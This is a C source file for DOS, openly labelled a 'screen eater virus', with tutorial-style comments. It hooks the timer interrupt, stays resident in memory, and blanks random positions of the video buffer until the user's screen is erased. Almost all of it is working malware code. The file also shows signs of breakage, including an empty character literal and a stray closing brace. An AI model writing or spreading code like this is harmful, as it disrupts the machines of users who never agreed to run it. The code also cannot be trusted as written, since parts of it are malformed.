/*C code to implement screen eater virus*/
//TSR program: remain active inside memory even after quiting the program
//getvect(): receive address of any ISR
//diffrent interrupt mouse and keyword 0-255, stored inside the interrupt vector table
//we can change the address of the interrupt to perform the action
//setvect(): set new address of defined interrupt handler
//keep(): reserve some space in memory to perform even after program termintation

#include "dos.h"
#include <conio.h>
#include <stdlib.h>
//it it a interrupt handler
//a pointer to function
void interrupt (*prevtimer)();

//second interrupt for using time as interrupt handler
void interrupt mytimer();

//main killer function
void writechar(char ch, int row, int col, int attr);
char far* scr; //to point to the graphic screen
int a, b;//global variables

void main()
{
scr=(char far*)0xb8000000; //access the graphic or video memory
  
prevtimer=getvect(8); // point to the getvect(8),receive any adress of any ISR,

//set new address of defined interrupt handler after getting the address
setvect(8,mytimer); //whenever the interrupt 8 occurs, instead of the time function called, the virus function will be called

//reserves memory after program terminated, 1000 bytes
keep(0,1000);
}

void interrupt mytimer()
{
a= random(25); //row
b= random(80); //col
writechar('',a,b,0);
(*prevtimer)();
}

void writechar(char ch, int row, int col, int attr)
{
  //writing single character to the screen
  //provide blank space with black color with random points
*(scr+row*160+col*2)=ch;
*(scr+row*160+col*2+1)=attr;
}
//after finishing the code, go to the dos command shell to call the program
}
